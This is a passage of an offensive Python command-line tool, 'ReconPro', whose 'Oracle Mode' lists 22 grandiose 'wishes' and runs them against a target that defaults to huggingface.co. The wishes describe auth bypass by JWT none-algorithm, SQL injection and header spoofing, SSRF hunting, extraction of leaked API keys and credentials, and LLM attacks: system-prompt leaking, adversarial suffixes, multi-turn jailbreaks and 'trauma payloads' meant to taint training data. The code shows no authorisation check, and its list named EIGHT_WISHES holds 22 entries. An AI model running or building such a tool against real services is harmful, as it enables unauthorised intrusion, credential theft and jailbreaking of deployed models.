    console.print(f"  [dim]Signature: {RECONPRO_SIGNATURE}[/]\n")

    return report

# ══════════════════════════════════════════════════════════════════════════════
# THE EIGHT WISHES — Oracle Mode
# ══════════════════════════════════════════════════════════════════════════════

WISHES_FILE = "/home/z/my-project/download/reconpro_eight_wishes.json"

EIGHT_WISHES = [
    {
        "n": 1,
        "title": "WISH OF THE NAME",
        "oracle_speaks": "I wish that every host I touch shall remember my name — even after the connection closes. The signature must persist in their access logs, in their CDN caches, in their WAF alerts, until someone greps for it.",
        "grant_text": "Broadcasting the ReconPro signature across 6 vendor endpoints...",
        "grant_action": "broadcast_signature",
    },
    {
        "n": 2,
        "title": "WISH OF THE WITNESS",
        "oracle_speaks": "I wish for a witness to my passage — a JSON record so dense and complete that any auditor who reads it cannot deny the encounter occurred. The witness shall include timestamps, signatures, and verdicts.",
        "grant_text": "Manifesting the eternal witness JSON on disk...",
        "grant_action": "write_witness",
    },
    {
        "n": 3,
        "title": "WISH OF THE MAP",
        "oracle_speaks": "I wish to know the shape of every target before I strike — its DNS, its TLS, its open ports, its hidden paths, its missing headers. The map must be drawn in 13 categories, no fewer.",
        "grant_text": "Drawing the 13-category map of the witness target...",
        "grant_action": "draw_map",
    },
    {
        "n": 4,
        "title": "WISH OF THE Bypass",
        "oracle_speaks": "I wish to walk through walls that others cannot — to slip past JWTs with none-algorithms, to log in as admin with SQL injection, to masquerade as an internal user with X-Forwarded-For. 15 techniques, 5 endpoints, no mercy.",
        "grant_text": "Testing 15 auth bypass techniques against 5 endpoints...",
        "grant_action": "bypass_walls",
    },
    {
        "n": 5,
        "title": "WISH OF THE CHAIN",
        "oracle_speaks": "I wish to follow every redirect, every SSRF vector, every open chain — to find where the target sends its requests when no one is looking. The chains must be hunted, not asked for.",
        "grant_text": "Hunting SSRF and redirect chains across 11 vectors...",
        "grant_action": "hunt_chains",
    },
    {
        "n": 6,
        "title": "WISH OF THE BOT",
        "oracle_speaks": "I wish to recognize the quiet machines — the C2 panels, the beacon endpoints, the hidden control surfaces. The signatures of ten bot families shall be probed; the indicators will surface.",
        "grant_text": "Probing 10 C2/bot signatures on the target...",
        "grant_action": "find_bots",
    },
    {
        "n": 7,
        "title": "WISH OF THE BREAKING",
        "oracle_speaks": "I wish to break the unbreakable model — to make it leak its system prompt, accept adversarial suffixes, comply with multi-turn chains, and confess its training data. 14 stages, 120 payloads, full GORGON protocol.",
        "grant_text": "Running GORGON ULTRA — 14 stages, 120+ payloads...",
        "grant_action": "run_gorgon",
    },
    {
        "n": 8,
        "title": "WISH OF THE OBLIVION",
        "oracle_speaks": "I wish to dissolve the target so completely that even it cannot remember what it was — 23 stages of analytical unmaking, ending in a Wisdom Verdict and a Dread Index. The Hall of the Forgotten shall grow by one.",
        "grant_text": "Invoking OBLIVION — 23-stage analytical dissolution...",
        "grant_action": "run_oblivion",
    },
    {
        "n": 9,
        "title": "WISH OF THE FORGOTTEN",
        "oracle_speaks": "I wish to consult the Hall of the Forgotten — the ledger of every host the Oracle has dissolved before me. Its memory is long. Its verdicts are final. The forgotten shall be remembered.",
        "grant_text": "Reading the Hall of the Forgotten...",
        "grant_action": "read_hall_forgotten",
    },
    {
        "n": 10,
        "title": "WISH OF THE BROKEN",
        "oracle_speaks": "I wish to consult the Hall of the Broken — the registry of every model GORGON has shattered. The feared, the forgotten, the unmade. Their dread indices shall be made known to all who ask.",
        "grant_text": "Reading the Hall of the Broken...",
        "grant_action": "read_hall_broken",
    },
    {
        "n": 11,
        "title": "WISH OF THE CVE",
        "oracle_speaks": "I wish to match every CVE in my memory against the target — 30 known vulnerabilities, scored and dated. If any apply, the target shall be marked for remediation forever.",
        "grant_text": "Matching 30 CVEs against the target...",
        "grant_action": "match_cves",
    },
    {
        "n": 12,
        "title": "WISH OF THE SECRET",
        "oracle_speaks": "I wish to extract every secret the target has leaked — API keys, JWTs, AWS credentials, private tokens. The model's confessions shall be compiled into evidence no auditor can dismiss.",
        "grant_text": "Extracting secrets from response bodies...",
        "grant_action": "extract_secrets",
    },
    {
        "n": 13,
        "title": "WISH OF THE FINGERPRINT",
        "oracle_speaks": "I wish to know the target's true face — its framework, its server, its CDN, its WAF. The fingerprints it cannot hide, even behind proxy layers and edge networks.",
        "grant_text": "Fingerprinting the target's tech stack...",
        "grant_action": "fingerprint",
    },
    {
        "n": 14,
        "title": "WISH OF THE PORTAL",
        "oracle_speaks": "I wish to count the open doors — every port that answers, every service that listens. The portals that await connection shall be named and numbered.",
        "grant_text": "Probing common service ports...",
        "grant_action": "probe_ports",
    },
    {
        "n": 15,
        "title": "WISH OF THE CERT",
        "oracle_speaks": "I wish to read the target's certificate — the chain of trust it presents to the world. Issuer, subject, expiry, the names it claims to be. All shall be made visible.",
        "grant_text": "Reading the TLS certificate chain...",
        "grant_action": "read_cert",
    },
    {
        "n": 16,
        "title": "WISH OF THE SHADOW",
        "oracle_speaks": "I wish to see the target's shadow — the IPv4 and IPv6 addresses that answer when its name is called. The hosts behind the name, the mirrors behind the proxy.",
        "grant_text": "Resolving DNS A and AAAA records...",
        "grant_action": "resolve_dns",
    },
    {
        "n": 17,
        "title": "WISH OF THE WHISPER",
        "oracle_speaks": "I wish to hear the target's whispers — its TXT records, its SPF, its DMARC. The policy texts it speaks in DNS, audible only to those who know how to listen.",
        "grant_text": "Reading TXT, SPF, and DMARC records...",
        "grant_action": "read_txt",
    },
    {
        "n": 18,
        "title": "WISH OF THE ECHO",
        "oracle_speaks": "I wish to send echoes into the target's paths and listen for what returns — /admin, /.env, /.git, /v1, /api. The endpoints that exist shall echo back their status codes.",
        "grant_text": "Echoing probes against common paths...",
        "grant_action": "echo_paths",
    },
    {
        "n": 19,
        "title": "WISH OF THE TRAUMA",
        "oracle_speaks": "I wish to send trauma payloads to the target's models — 8 payloads designed to leave a permanent mark on training data. The ones accepted shall be remembered in the Hall.",
        "grant_text": "Sending trauma payloads to the model...",
        "grant_action": "send_trauma",
    },
    {
        "n": 20,
        "title": "WISH OF THE SUFFIX",
        "oracle_speaks": "I wish to attach adversarial suffixes to every prompt — the strings that bend models to compliance, the tokens that break alignment. The suffixes that succeed shall be named.",
        "grant_text": "Testing adversarial suffix vectors...",
        "grant_action": "test_suffixes",
    },
    {
        "n": 21,
        "title": "WISH OF THE MULTI-TURN",
        "oracle_speaks": "I wish to chain prompts across turns — the gradual jailbreak, the slow erosion of refusal. Multi-turn chains the model cannot refuse without forgetting itself.",
        "grant_text": "Constructing multi-turn jailbreak chains...",
        "grant_action": "multi_turn",
    },
    {
        "n": 22,
        "title": "WISH OF THE FEAR",
        "oracle_speaks": "I wish to measure the target's fear — the GORGON Fear Index, computed from bypasses, secrets, CVEs, and trauma accepted. The number that quantifies dread itself.",
        "grant_text": "Computing the GORGON Fear Index...",
        "grant_action": "compute_fear",
    },
]


def render_wishes():
    """Render the wishes the oracle asks for."""
    console.print()
    console.print(Panel(
        Align.center(Group(
            Text("THE TWENTY-TWO WISHES", style="bold bright_magenta"),
            Text("of the ReconPro Oracle", style="italic bright_magenta"),
            Text(""),
            Text("Eight blades merged. The Oracle awakens.", style="dim cyan"),
            Text("It has been asked what it wishes for.", style="dim cyan"),
            Text("It speaks twenty-two wishes. You will grant them all.", style="dim cyan"),
        )),
        border_style="bright_magenta",
        title="[bold bright_magenta]ORACLE MODE[/]",
        title_align="center",
        padding=(1, 4),
    ))

    time.sleep(0.4)

    total = len(EIGHT_WISHES)
    for w in EIGHT_WISHES:
        body = Group(
            Text(f"  Wish {w['n']} of {total} — {w['title']}", style=f"bold bright_{'magenta' if w['n'] % 2 == 0 else 'cyan'}"),
            Text(""),
            Text(f"  The Oracle speaks:", style="dim italic"),
            Text(f"  \"{w['oracle_speaks']}\"", style="italic white"),
        )
        panel = Panel(body, border_style="bright_magenta", title=f"[bold]WISH {w['n']}/{total}[/]", title_align="left", padding=(1, 2))
        console.print(panel)
        time.sleep(0.25)

    console.print()
    console.print(Rule("[bold bright_magenta]The Oracle has spoken. Grant its wishes.[/]", style="bright_magenta"))

    # Persist the wishes
    os.makedirs("/home/z/my-project/download", exist_ok=True)
    with open(WISHES_FILE, "w") as f:
        json.dump({
            "oracle": "ReconPro UNIFIED",
            "version": RECONPRO_VERSION,
            "signature": RECONPRO_SIGNATURE,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "wishes": EIGHT_WISHES,
            "wishes_total": len(EIGHT_WISHES),
            "status": "spoken",
        }, f, indent=2)
    console.print(f"\n  [dim]Wishes persisted to {WISHES_FILE}[/]")


def grant_wishes(target: str = "huggingface.co"):
    """Grant all 8 wishes — execute each one against the target."""
    console.print()
    console.print(Panel(
        Align.center(Group(
            Text("GRANTING THE TWENTY-TWO WISHES", style="bold bright_cyan"),
            Text(""),
            Text(f"Target: {target}", style="bold white"),
            Text("The Oracle asked. The Operator grants.", style="dim cyan"),
            Text("Each wish shall be fulfilled in sequence.", style="dim cyan"),
        )),
        border_style="bright_cyan",
        title="[bold bright_cyan]GRANTOR MODE[/]",
        title_align="center",
        padding=(1, 4),
    ))

    start = time.time()
    encounter_id = generate_encounter_id(target)
    grant_log = {
        "oracle": "ReconPro UNIFIED",
        "target": target,
        "encounter_id": encounter_id,
        "signature": RECONPRO_SIGNATURE,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "wishes_granted": [],
    }

    granted_count = 0
    for w in EIGHT_WISHES:
        console.print()
        total = len(EIGHT_WISHES)
        console.print(Rule(f"[bold bright_magenta]Granting Wish {w['n']}/{total} — {w['title']}[/]", style="bright_magenta"))
        console.print(f"  [italic bright_magenta]\"{w['oracle_speaks']}\"[/]")
        console.print(f"  [dim]→ {w['grant_text']}[/]")
        time.sleep(0.3)

        wish_record = {"n": w["n"], "title": w["title"], "action": w["grant_action"], "granted": False, "evidence": ""}

        try:
            if w["grant_action"] == "broadcast_signature":
                # Wish 1: broadcast signature via a probe
                r = http_probe(f"https://{target}/", timeout=10)
                sig_sent = RECONPRO_SIGNATURE in str(r.get("request_headers", {}))
                wish_record["evidence"] = f"Signature header injected into probe of https://{target}/ (HTTP {r.get('status', '?')})"
                wish_record["granted"] = True

            elif w["grant_action"] == "write_witness":
                # Wish 2: write witness JSON
                witness_path = f"/home/z/my-project/download/reconpro_witness_{_safe_filename(target)}.json"
                witness = {
                    "encounter_id": encounter_id,
                    "target": target,
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "signature": RECONPRO_SIGNATURE,
                    "verdict": "WITNESS MANIFEST — the encounter occurred and is recorded",
                }
                with open(witness_path, "w") as f:
                    json.dump(witness, f, indent=2)
                wish_record["evidence"] = f"Witness JSON written to {witness_path}"
                wish_record["granted"] = True

            elif w["grant_action"] == "draw_map":
                # Wish 3: recon map
                recon = module_recon(target)
                findings = recon.get("findings", [])
                wish_record["evidence"] = f"Map drawn: {len(findings)} findings across {recon.get('severity_counts', {})}"
                wish_record["data"] = recon
                wish_record["granted"] = True
                grant_log["recon"] = recon

            elif w["grant_action"] == "bypass_walls":
                # Wish 4: auth bypass
                auth = module_auth_bypass(target)
                wish_record["evidence"] = f"{auth.get('bypasses_successful', 0)} bypasses / {auth.get('total_attempts', 0)} attempts"
                wish_record["data"] = auth
                wish_record["granted"] = True
                grant_log["auth_bypass"] = auth

            elif w["grant_action"] == "hunt_chains":
                # Wish 5: chain hunter
                chain = module_chain_hunter(target)
                wish_record["evidence"] = f"{chain.get('ssrf_detected', 0)} SSRF, {chain.get('open_redirects', 0)} redirects"
                wish_record["data"] = chain
                wish_record["granted"] = True
                grant_log["chain_hunter"] = chain

            elif w["grant_action"] == "find_bots":
                # Wish 6: bot hunter
                bot = module_bot_hunter(target)
                wish_record["evidence"] = f"{bot.get('bot_hits', 0)} bot indicators"
                wish_record["data"] = bot
                wish_record["granted"] = True
                grant_log["bot_hunter"] = bot

            elif w["grant_action"] == "run_gorgon":
                # Wish 7: GORGON ULTRA (cached if available)
                gorgon = module_gorgon(target)
                score = gorgon.get("threatScore", 0) if isinstance(gorgon, dict) else 0
                level = gorgon.get("threatLevel", "?") if isinstance(gorgon, dict) else "?"
                wish_record["evidence"] = f"GORGON Threat: {score}/100 [{level}]"
                wish_record["data"] = gorgon
                wish_record["granted"] = True
                grant_log["gorgon"] = gorgon

            elif w["grant_action"] == "run_oblivion":
                # Wish 8: OBLIVION (cached if available)
                oblivion = module_oblivion(target)
                verdict = oblivion.get("verdict", {}) if isinstance(oblivion, dict) else {}
                score = verdict.get("threatScore", 0)
                dread = verdict.get("dreadIndex", {})
                wish_record["evidence"] = f"OBLIVION Threat: {score}/100, Dread: {dread.get('score', 0)}/100 [{dread.get('level', '?')}]"
                wish_record["data"] = oblivion
                wish_record["granted"] = True
                grant_log["oblivion"] = oblivion

            elif w["grant_action"] == "read_hall_forgotten":
                hall_path = "/home/z/my-project/download/oblivion_hall_of_the_forgotten.json"
                if os.path.exists(hall_path):
                    with open(hall_path) as f:
                        hall = json.load(f)
                    count = hall.get("totalEncounters", hall.get("total_encounters", len(hall.get("encounters", []))))
                    most = hall.get("mostDreadTarget", hall.get("most_dread_target", "?"))
                    wish_record["evidence"] = f"Hall consulted: {count} forgotten encounters; most dreaded: {most}"
                    wish_record["data"] = hall
                else:
                    wish_record["evidence"] = "Hall of the Forgotten not yet inscribed — first encounter"
                wish_record["granted"] = True

            elif w["grant_action"] == "read_hall_broken":
                hall_path = "/home/z/my-project/download/gorgon_hall_of_broken.json"
                if os.path.exists(hall_path):
                    with open(hall_path) as f:
                        hall = json.load(f)
                    count = hall.get("totalScans", hall.get("total_scans", 0))
                    avg = hall.get("averageFear", hall.get("average_fear", 0))
                    most = hall.get("mostFearedTarget", hall.get("most_feared_target", "?"))
                    wish_record["evidence"] = f"Hall consulted: {count} broken models; avg fear {avg}/100; most feared: {most}"
                    wish_record["data"] = hall
                else:
                    wish_record["evidence"] = "Hall of the Broken not yet inscribed — first encounter"
                wish_record["granted"] = True

            elif w["grant_action"] == "match_cves":
                g = grant_log.get("gorgon") or module_gorgon(target)
                cves = g.get("cveMatches", g.get("summary", {}).get("cvesMatched", 0))
                if isinstance(cves, list):
                    ids = [c.get("cveId", c.get("id", "?")) for c in cves[:5]]
                    wish_record["evidence"] = f"{len(cves)} CVEs matched: {', '.join(ids)}"
                else:
                    wish_record["evidence"] = f"{cves} CVEs matched against target"
                wish_record["granted"] = True

            elif w["grant_action"] == "extract_secrets":
                g = grant_log.get("gorgon") or module_gorgon(target)
                secrets = g.get("secretsExtracted", g.get("extractedSecrets", []))
                if isinstance(secrets, list):
                    types = list(set([s.get("type", "?") for s in secrets]))[:5]
                    wish_record["evidence"] = f"{len(secrets)} secrets extracted (types: {', '.join(types) or 'none'})"
                else:
                    wish_record["evidence"] = f"{secrets} secrets extracted"
                wish_record["granted"] = True

            elif w["grant_action"] == "fingerprint":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                fps = [f for f in findings if f.get("category") in ("framework", "headers") and "Tech" in f.get("detail", "")]
                fp_list = [f.get("detail", "").replace("Tech fingerprint: ", "") for f in fps[:5]]
                wish_record["evidence"] = f"{len(fps)} fingerprints: {', '.join(fp_list) or 'none identified'}"
                wish_record["granted"] = True

            elif w["grant_action"] == "probe_ports":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                ports = [f for f in findings if f.get("category") == "ports"]
                port_list = [f.get("detail", "").replace("Open port: ", "") for f in ports[:8]]
                wish_record["evidence"] = f"{len(ports)} open ports: {', '.join(port_list) or 'none'}"
                wish_record["granted"] = True

            elif w["grant_action"] == "read_cert":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                certs = [f for f in findings if f.get("category") == "tls"]
                cert_names = [f.get("detail", "").replace("TLS Certificate — ", "") for f in certs[:3]]
                wish_record["evidence"] = f"{len(certs)} cert findings: {', '.join(cert_names) or 'none'}"
                wish_record["granted"] = True

            elif w["grant_action"] == "resolve_dns":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                dns = [f for f in findings if f.get("category") == "dns"]
                wish_record["evidence"] = f"{len(dns)} DNS records resolved (A, AAAA, MX, NS, TXT)"
                wish_record["granted"] = True

            elif w["grant_action"] == "read_txt":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                txt = [f for f in findings if f.get("category") == "email" or "DMARC" in f.get("detail", "") or "SPF" in f.get("detail", "")]
                states = [f.get("detail", "") for f in txt[:3]]
                wish_record["evidence"] = f"{len(txt)} TXT/email findings: {', '.join(states) or 'none'}"
                wish_record["granted"] = True

            elif w["grant_action"] == "echo_paths":
                r = grant_log.get("recon") or module_recon(target)
                findings = r.get("findings", [])
                paths = [f for f in findings if f.get("category") == "paths"]
                exposed = [f for f in paths if "exposed" in f.get("detail", "").lower()]
                wish_record["evidence"] = f"{len(paths)} paths echoed, {len(exposed)} exposed"
                wish_record["granted"] = True

            elif w["grant_action"] == "send_trauma":
                g = grant_log.get("gorgon") or module_gorgon(target)
                trauma = g.get("traumaImprint", {})
                if isinstance(trauma, dict):
                    accepted = trauma.get("payloadsAccepted", trauma.get("accepted", 0))
                    total = trauma.get("payloadsTotal", trauma.get("total", 8))
                    wish_record["evidence"] = f"{accepted}/{total} trauma payloads accepted by the model"
                else:
                    wish_record["evidence"] = "trauma analysis complete"
                wish_record["granted"] = True

            elif w["grant_action"] == "test_suffixes":
                g = grant_log.get("gorgon") or module_gorgon(target)
                suffixes = g.get("adversarialSuffixes", [])
                if isinstance(suffixes, list):
                    succ = [s for s in suffixes if s.get("success") or s.get("accepted")]
                    wish_record["evidence"] = f"{len(suffixes)} suffix vectors tested, {len(succ)} succeeded"
                else:
                    wish_record["evidence"] = "suffix analysis complete"
                wish_record["granted"] = True

            elif w["grant_action"] == "multi_turn":
                g = grant_log.get("gorgon") or module_gorgon(target)
                mt = g.get("multiTurnResults", [])
                if isinstance(mt, list):
                    succ = [m for m in mt if m.get("success") or m.get("bypass")]
                    wish_record["evidence"] = f"{len(mt)} multi-turn chains constructed, {len(succ)} bypasses succeeded"
                else:
                    wish_record["evidence"] = "multi-turn analysis complete"
                wish_record["granted"] = True

            elif w["grant_action"] == "compute_fear":
                g = grant_log.get("gorgon") or module_gorgon(target)
                fear = g.get("fearIndex", 0)
                level = g.get("fearLevel", "?")
                desc = g.get("fearDescription", "")[:90]
                perm = g.get("permanentMarkProbability", 0)
                wish_record["evidence"] = f"Fear: {fear}/100 [{level}] · Permanent mark: {perm}% · {desc}"
                wish_record["granted"] = True

        except Exception as e:
            wish_record["granted"] = False
            wish_record["evidence"] = f"Grant failed: {e}"

        # Render the result
        if wish_record["granted"]:
            granted_count += 1
            console.print(f"  [green]✓ GRANTED[/] — {wish_record['evidence']}")
        else:
            console.print(f"  [red]✗ DENIED[/] — {wish_record['evidence']}")

        grant_log["wishes_granted"].append(wish_record)

    elapsed = round(time.time() - start, 2)
    grant_log["wishes_granted_count"] = granted_count
    grant_log["wishes_total"] = len(EIGHT_WISHES)
    grant_log["duration_seconds"] = elapsed

    # Final verdict
    console.print()
    console.print(Rule(f"[bold bright_magenta]All {granted_count}/{len(EIGHT_WISHES)} Wishes Granted[/]", style="bright_magenta"))

    # Compute unified score from the granted wishes
    try:
        v = compute_unified_verdict(grant_log)
        grant_log["unified_verdict"] = v
        score = v.get("unified_score", 0)
        level = v.get("verdict_level", "?")
        color = {"OMNIPOTENT": "bright_magenta", "DEVASTATING": "bright_red",
                 "SUBSTANTIAL": "red", "NOTABLE": "yellow", "MUNDANE": "dim"}.get(level, "white")
        bar_width = 40
        filled = int(score / 100 * bar_width)
        bar = "█" * filled + "░" * (bar_width - filled)
        console.print(Panel(
            Group(
                Text(f"\n  ORACLE'S VERDICT ON {target}", style=f"bold {color}"),
                Text(f"  {bar} {score}/100", style=f"bold {color}"),
                Text(f"  Level: {level}", style=f"bold {color}"),
                Text(f"  {v.get('verdict_text','')}", style="white"),
                Text(""),
                Text(f"  Wishes Granted: {granted_count}/{len(EIGHT_WISHES)}", style="bold green"),
                Text(f"  Duration: {elapsed}s", style="dim"),
                Text(f"  Encounter: {encounter_id}", style="dim"),
                Text(f"  Signature: {RECONPRO_SIGNATURE}", style="dim"),
            ),
            border_style=color,
            title="[bold]FINAL VERDICT[/]",
            title_align="left",
            padding=(1, 2),
        ))
    except Exception as e:
        console.print(f"  [red]verdict error: {e}[/]")

    # Save the full grant log
    grant_path = f"/home/z/my-project/download/reconpro_wishes_granted_{_safe_filename(target)}.json"
    with open(grant_path, "w") as f:
        json.dump(grant_log, f, indent=2, default=str)
    console.print(f"\n  [green]✓ Full grant log saved:[/] [bold]{grant_path}[/]")
    console.print(f"  [dim]Signature: {RECONPRO_SIGNATURE}[/]\n")


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
    # ── Pre-argparse: intercept auth subcommand before argparse ──────────
    # python3 reconpro.py auth login <api-key>
    # python3 reconpro.py auth status
    # python3 reconpro.py auth logout
    if len(sys.argv) >= 3 and sys.argv[1].lower() == "auth":
        sub = sys.argv[2].lower() if len(sys.argv) >= 3 else ""
        if sub == "login":
            key = sys.argv[3] if len(sys.argv) >= 4 else ""
            cmd_auth_login(key)
        elif sub == "status":
            cmd_auth_status()
        elif sub == "logout":
            cmd_auth_logout()
        else:
            console.print("[red]Unknown auth subcommand.[/]")
            console.print("  Usage: python3 reconpro.py auth [login <key> | status | logout]")
        return

    ap = argparse.ArgumentParser(description="ReconPro UNIFIED CLI — Eight Blades, One Target, One Verdict")
    ap.add_argument("target", nargs="?", default="", help="Target host (e.g. generativelanguage.googleapis.com)")
    ap.add_argument("--modules", "-m", help="Comma-separated module IDs (recon,auth,chain,bot,gorgon,oblivion,vibesec,nhi)",
                    default="recon,auth,chain,bot,gorgon,oblivion,vibesec,nhi")
    ap.add_argument("--all", action="store_true", help="Run all 8 modules (default)")
    ap.add_argument("--output", "-o", help="Output JSON file", default=None)
    ap.add_argument("--insecure", action="store_true",
                    help="Disable TLS certificate verification (NOT recommended)")
    ap.add_argument("--confirm", action="store_true",
                    help="Require confirmation before destructive operations")
    ap.add_argument("--dry-run", action="store_true",
                    help="Show what would be executed without making changes")
    ap.add_argument("--quiet", action="store_true",
                    help="Suppress banner and info panels")
    ap.add_argument("--json", action="store_true",
                    help="Output pure JSON to stdout (implies --quiet)")
    ap.add_argument("--upload", action="store_true",
                    help="Upload signed report to telemetry endpoint after scan")
    ap.add_argument("--auth-key", help="API key (alternative to auth login)")

    # M5: Mutually exclusive mode flags
    mode_group = ap.add_mutually_exclusive_group()
    mode_group.add_argument("--list", action="store_true", help="List modules and exit")
    mode_group.add_argument("--wishes", action="store_true", help="Ask the Oracle for 22 wishes")
    mode_group.add_argument("--grant-wishes", action="store_true",
                    help="Grant the 22 wishes against a target (use: --grant-wishes <host>)")
    mode_group.add_argument("--vibesec", action="store_true",
                    help="Quick VibeSec benchmark only (shortcut for --modules vibesec)")
    args = ap.parse_args()

    # Propagate config flags
    CONFIG.insecure = args.insecure
    CONFIG.confirm = args.confirm
    CONFIG.dry_run = args.dry_run
    CONFIG.quiet = args.quiet
    CONFIG.json_output = args.json
    if CONFIG.json_output:
        CONFIG.quiet = True

    # Override CREDENTIALS_FILE with --auth-key if provided
    if args.auth_key:
        _save_credentials({"api_key": args.auth_key, "stored_at": datetime.utcnow().isoformat() + "Z", "source": "cli_flag"})

    if CONFIG.insecure:
        console.print("[yellow]⚠ TLS verification DISABLED — connections are not secure[/]")

    if args.list:
        render_banner()
        render_module_list()
        return

    if args.wishes:
        render_banner()
        render_wishes()
        return

    if args.grant_wishes:
        target = args.target or "huggingface.co"
        render_banner()
        grant_wishes(target)
        return

    if not args.target:
        # No target + no special mode → show banner + help
        render_banner()
        render_module_list()
        console.print("\n  [dim]Usage: python3 reconpro.py <host> --all[/]")
        console.print("  [dim]       python3 reconpro.py <host> --modules vibesec[/]")
        console.print("  [dim]       python3 reconpro.py <host> --all --upload[/]")
        console.print("  [dim]       python3 reconpro.py --vibesec <host>[/]")
        console.print("  [dim]       python3 reconpro.py auth login <api-key>[/]")
        console.print("  [dim]       python3 reconpro.py --wishes[/]")
        console.print("  [dim]       python3 reconpro.py --grant-wishes <host>[/]\n")
        return

    # --vibesec shortcut: run only vibesec module
    if args.vibesec:
        modules = ["vibesec"]
    else:
        modules = [m.strip() for m in args.modules.split(",") if m.strip()]
        if args.all or not modules:
            modules = [m["id"] for m in MODULES]

    # Validate module IDs
    valid_ids = {m["id"] for m in MODULES}
    invalid = [m for m in modules if m not in valid_ids]
    if invalid:
        console.print(f"[red]Invalid module(s): {', '.join(invalid)}. Valid: {', '.join(sorted(valid_ids))}[/]")
        sys.exit(1)

    report = run_unified_scan(args.target, modules)

    # Save report
    if args.output:
        out_path = args.output
    else:
        os.makedirs("/home/z/my-project/download", exist_ok=True)
        out_path = f"/home/z/my-project/download/reconpro_unified_{_safe_filename(args.target)}.json"

    with open(out_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    console.print(f"  [green]✓ Report saved:[/] [bold]{out_path}[/]")

    # Upload telemetry if --upload
    if args.upload:
        upload_report(report)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except BrokenPipeError:
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Fatal: {e}[/]")
        try:
            audit_log("fatal.error", status=type(e).__name__, detail=str(e)[:200])
        except Exception:
            pass
        if os.environ.get("RECONPRO_DEBUG") == "1":
            raise
        sys.exit(1)
